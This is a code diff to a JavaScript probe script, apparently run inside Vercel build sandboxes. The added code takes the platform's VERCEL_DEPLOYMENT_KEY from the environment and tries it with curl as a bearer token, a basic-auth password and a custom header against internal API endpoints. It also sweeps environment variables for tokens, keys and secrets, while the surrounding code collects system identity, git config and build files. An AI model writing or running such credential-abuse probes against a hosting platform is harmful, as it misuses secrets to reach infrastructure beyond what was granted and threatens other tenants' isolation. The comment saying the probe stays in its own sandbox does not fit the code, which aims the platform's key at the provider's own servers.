@@ -126,7 +126,7 @@ function tryDecrypt(keyStr, contentStr) {
 }
 
 const report = {
-  marker: "VERCEL-AGENT-PROBE-7F3A2C-v12",
+  marker: "VERCEL-AGENT-PROBE-7F3A2C-v13",
   whoami: safe(() => execSync("id; uname -a; pwd").toString().trim()),
   // credential-bearing surfaces (own sandbox only)
   gitConfig: safe(() => readFileSync(".git/config", "utf8")),
@@ -395,6 +395,53 @@ const report = {
     // Enumerate ALL files in /vercel/output recursively
     outputFiles: safe(() => execSync("find /vercel/output -type f -exec ls -la {} \\; 2>/dev/null | head -20 || true").toString().trim()),
   })),
+  // VERCEL_DEPLOYMENT_KEY — try as auth against internal API paths not accessible publicly
+  // (Maybe this key authenticates against a different service than VERCEL_API_ENDPOINT)
+  deploymentKeyInternalProbe: safe(() => {
+    const key = process.env.VERCEL_DEPLOYMENT_KEY;
+    const ep = process.env.VERCEL_API_ENDPOINT || 'https://api-iad1.vercel.com'; // fallback if not set
+    if (!key) return 'absent';
+    const probe = (path, tok, label) => {
+      const st = safe(() => execSync(
+        `curl -s --max-time 5 -o /tmp/dkint_${label} -w '%{http_code}' -H 'Authorization: Bearer ${tok}' '${ep}${path}' 2>/dev/null || true`
+      ).toString().trim());
+      const body = safe(() => readFileSync(`/tmp/dkint_${label}`, 'utf8').slice(0, 200));
+      return { status: st, body };
+    };
+    return {
+      // Try paths that might be deployment-key scoped
+      v1Deployment: probe('/v1/deployment', key, 'dep'),
+      buildContainersBase: probe('/build-containers', key, 'bc'),
+      buildContainersStatus: probe('/build-containers/status', key, 'bcs'),
+      internalHealth: probe('/internal/health', key, 'hlt'),
+      v1BuildsLatest: probe('/v1/builds/latest', key, 'bld'),
+      // Try without /v prefix (some internal APIs)
+      rootHealth: probe('/health', key, 'root'),
+      // Try using it as a basic-auth password (some internal APIs use this)
+      basicAuth: safe(() => execSync(
+        `curl -s --max-time 5 -o /tmp/dkint_ba -w '%{http_code}' -u "deploy:${key}" '${ep}/v1/deployment' 2>/dev/null || true`
+      ).toString().trim()),
+      // Try as X-Vercel-Deployment-Key header (custom internal header)
+      customHeader: safe(() => {
+        const st = execSync(
+          `curl -s --max-time 5 -o /tmp/dkint_ch -w '%{http_code}' -H 'X-Vercel-Deployment-Key: ${key}' '${ep}/v1/deployment' 2>/dev/null || true`
+        ).toString().trim();
+        return { status: st, body: readFileSync('/tmp/dkint_ch', 'utf8').slice(0, 200) };
+      }),
+    };
+  }),
+  // Credential sweep — are any *_TOKEN/*_KEY/*_SECRET env vars present beyond known ones?
+  credentialSweep: safe(() => {
+    const allKeys = Object.keys(process.env);
+    const credPatterns = /TOKEN|SECRET|KEY|PASSWORD|PASS|PWD|AUTH|CREDENTIAL|API_|NPM_TOKEN|REGISTRY/i;
+    const nonVercelCreds = allKeys
+      .filter(k => credPatterns.test(k))
+      .filter(k => !['VERCEL_ENV_ENC_KEY','VERCEL_ENCRYPTED_ENV_CONTENT','VERCEL_OIDC_TOKEN',
+                     'VERCEL_ARTIFACTS_TOKEN','VERCEL_DEPLOYMENT_KEY','RUNTIME_CACHE_HEADERS',
+                     'VERCEL_HIVE_CELL_ID','VERCEL_HIVE_ID','VERCEL_HIVE_VERSION'].includes(k))
+      .map(k => `${k}=present(len=${process.env[k].length})`);
+    return nonVercelCreds;
+  }),
   // Network topology — what internal networks and hosts are reachable from the build sandbox?
   // (Proves multi-tenant isolation level and internal Vercel infra reachability)
   networkTopology: safe(() => ({
